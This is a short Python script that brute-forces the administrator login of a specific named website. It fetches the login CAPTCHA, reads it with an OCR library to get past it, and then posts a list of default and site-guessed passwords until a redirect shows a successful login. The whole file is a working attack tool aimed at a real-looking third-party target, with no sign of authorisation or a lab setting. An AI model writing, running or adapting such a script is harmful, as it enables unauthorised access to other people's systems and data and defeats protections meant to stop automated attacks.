import subprocess, ddddocr, time

BASE = "http://yurenmed.com"
CK = "/tmp/yu_f.txt"
PWS = ["admin","admin123","123456","admin888","yurenmed","qdyuren","qd123456"]
OCR = ddddocr.DdddOcr(show_ad=False)

def cap():
    subprocess.run(["rm","-f",CK])
    subprocess.run(["curl","-sk",BASE,"-c",CK,"-o","/dev/null"],capture_output=True)
    subprocess.run(["curl","-sk",BASE+"/core/code.php","-b",CK,"-c",CK,"-o","/tmp/cap.png"],capture_output=True)
    with open("/tmp/cap.png","rb") as f:
        d = f.read()
    if len(d) < 100: return None
    return OCR.classification(d).strip()

for pw in PWS:
    for attempt in range(3):
        code = cap()
        if not code:
            print(f"  {pw}: cap fail")
            continue
        r = subprocess.run(["curl","-sk","-X","POST",BASE+"/admin.php/index/login",
            "-d",f"username=admin&password={pw}&checkcode={code}",
            "-b",CK,"-c",CK,"-D","/tmp/yh.txt","-o","/dev/null"],
            capture_output=True,timeout=10)
        with open("/tmp/yh.txt") as f:
            hdrs = f.read()
        loc = ""
        for line in hdrs.split(chr(10)):
            if line.lower().startswith("location:"):
                loc = line.strip()
                break
        if "index/index" in loc or "index/home" in loc:
            print(f"\n[!] LOGIN OK: admin:{pw} code={code}")
            print(f"    Redirect: {loc}")
            exit(0)
        print(f"  {pw}: code={code} | {loc[:60]}")
        time.sleep(0.5)
    print()

print("All failed")
